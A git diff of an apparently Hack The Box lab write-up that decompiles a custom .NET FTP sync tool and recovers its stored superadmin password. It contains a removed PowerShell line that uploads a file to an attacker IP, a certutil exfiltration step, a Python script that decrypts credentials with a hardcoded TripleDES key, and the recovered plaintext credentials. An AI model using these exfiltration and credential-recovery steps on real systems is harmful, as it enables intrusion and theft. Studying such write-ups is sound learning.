@@ -145,24 +145,14 @@ puppet:sunshine
 ansible:superman
 ```
 
+However, these credentials above did not working in any of the detected login pages.
 
-```
-Thursday, October 3, 2019 -- Upload File password.txt
-Thursday, October 3, 2019 -- System.Net.WebException: The remote server returned an error: (550) File unavailable (e.g., file not found, no access).
-   at System.Net.FtpWebRequest.SyncRequestCallback(Object obj)
-   at System.Net.FtpWebRequest.RequestCallback(Object obj)
-   at System.Net.CommandStream.Dispose(Boolean disposing)
-   at System.IO.Stream.Close()
-   at System.IO.Stream.Dispose()
-   at System.Net.ConnectionPool.Destroy(PooledStream pooledStream)
-   at System.Net.ConnectionPool.PutConnection(PooledStream pooledStream, Object owningObject, Int32 creationTimeout, Boolean canReuse)
-   at System.Net.FtpWebRequest.FinishRequestStage(RequestStage stage)
-   at System.Net.FtpWebRequest.GetRequestStream()
-   at SyncLocation.Service1.Copy()
-```
+Some more invetigation uncovered a tool called `Sync2Ftp`. Online searches for this brought up nothing of interest.
+Therefore, it can be assumed to be a custom tool
 
-$path = 'C:\Program Files'; $path -replace ' ', '` '; cd $path
+The directory `C:\Program Files\Sync2Ftp` included two files - the config:
 
+```xml
 <?xml version="1.0" encoding="utf-8" ?>
 <configuration>
   <appSettings>
@@ -176,51 +166,115 @@ $path = 'C:\Program Files'; $path -replace ' ', '` '; cd $path
   <startup>
     <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
   </startup>
-
-
 </configuration>
+```
+
+And an `.exe`. The thing to note is the use of `.Net`. If the `.exe` is compiled with `.Net` it should be very easy
+to reverse it and obtain very clear `.Net` code.
 
 
-<FileZillaServer>
-    <Settings>
-        <Item name="Admin port" type="numeric">14147</Item>
-    </Settings>
-    <Groups />
-    <Users>
-        <User Name="superadmin">
-            <Option Name="Pass">813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0</Option>
-            <Option Name="Salt">cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0</Option>
-            <Option Name="Group"></Option>
-            <Option Name="Bypass server userlimit">0</Option>
-            <Option Name="User Limit">0</Option>
-            <Option Name="IP Limit">0</Option>
-            <Option Name="Enabled">1</Option>
-            <Option Name="Comments"></Option>
-            <Option Name="ForceSsl">0</Option>
-            <IpFilter>
-                <Disallowed />
-                <Allowed />
-            </IpFilter>
-            <Permissions>
-                <Permission Dir="C:\Users\superadmin">
-                    <Option Name="FileRead">1</Option>
-                    <Option Name="FileWrite">0</Option>
-                    <Option Name="FileDelete">0</Option>
-                    <Option Name="FileAppend">0</Option>
-                    <Option Name="DirCreate">0</Option>
-                    <Option Name="DirDelete">0</Option>
-                    <Option Name="DirList">1</Option>
-                    <Option Name="DirSubdirs">1</Option>
-                    <Option Name="IsHome">1</Option>
-                    <Option Name="AutoCreate">0</Option>
-                </Permission>
-            </Permissions>
-            <SpeedLimits DlType="0" DlLimit="10" ServerDlLimitBypass="0" UlType="0" UlLimit="10" ServerUlLimitBypass="0">
-                <Download />
-                <Upload />
-            </SpeedLimits>
-        </User>
-    </Users>
-</FileZillaServer>
+I transfered it back to my machine as `base64` using:
+```
+certutil -encode SyncLocation.exe C:\tmp\base64.txt
+```
 
-Invoke-RestMethod -Uri http://10.10.14.14:8000 -Method Post -InFile SyncLocation.exe
+And decompiled it using JetBrains `dotPeak`.
+
+The `.exe` contains two methods, `encrypt` and `decrypt`:
+
+
+Decrypt:
+
+```C#
+public static string Decrypt(string cipherString, bool useHashing)
+{
+    byte[] inputBuffer = Convert.FromBase64String(cipherString);
+    string s = (string) new AppSettingsReader().GetValue("SecurityKey", typeof (string));
+    byte[] numArray;
+    if (useHashing)
+    {
+        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
+        numArray = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
+        cryptoServiceProvider.Clear();
+    }
+    else
+    numArray = Encoding.UTF8.GetBytes(s);
+    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
+    cryptoServiceProvider1.Key = numArray;
+    cryptoServiceProvider1.Mode = CipherMode.ECB;
+    cryptoServiceProvider1.Padding = PaddingMode.PKCS7;
+    byte[] bytes = cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
+    cryptoServiceProvider1.Clear();
+    return Encoding.UTF8.GetString(bytes);
+}
+```
+
+Encrypt:
+
+```C#
+public static string Encrypt(string toEncrypt, bool useHashing)
+{
+    byte[] bytes = Encoding.UTF8.GetBytes(toEncrypt);
+    string s = (string) new AppSettingsReader().GetValue("SecurityKey", typeof (string));
+    byte[] numArray;
+    if (useHashing)
+    {
+        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
+        numArray = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
+        cryptoServiceProvider.Clear();
+    }
+    else
+    numArray = Encoding.UTF8.GetBytes(s);
+    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
+    cryptoServiceProvider1.Key = numArray;
+    cryptoServiceProvider1.Mode = CipherMode.ECB;
+    cryptoServiceProvider1.Padding = PaddingMode.PKCS7;
+    byte[] inArray = cryptoServiceProvider1.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
+    cryptoServiceProvider1.Clear();
+    return Convert.ToBase64String(inArray, 0, inArray.Length);
+}
+```
+
+The method we want here is `decrypt`. Below is it converted into a `python` script:
+
+
+```python
+import base64
+import hashlib
+from Crypto.Cipher import DES3
+
+SecurityKey = "_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"
+
+password = "oQ5iORgUrswNRsJKH9VaCw=="
+username = "4as8gqENn26uTs9srvQLyg=="
+
+def decrypt(string, hashing):
+
+    base64_data = base64.b64decode(string)
+
+    SecKeyBytes = SecurityKey.encode("utf-8")
+
+    if hashing:
+        numArray = hashlib.md5(SecKeyBytes).digest()
+    else:
+        numArray = SecKeyBytes
+
+    cipher = DES3.new(numArray, DES3.MODE_ECB)
+
+    d = cipher.decrypt(base64_data)
+
+    print(d.decode())
+
+decrypt(username, hashing=True)
+decrypt(password, hashing=True)
+```
+
+We get from this a username and password:
+
+```
+superadmin
+funnyhtb
+```
+
+We can then use this to log on as the `superadmin` via the `ftp` server.
+This lets us grab the `root.txt`
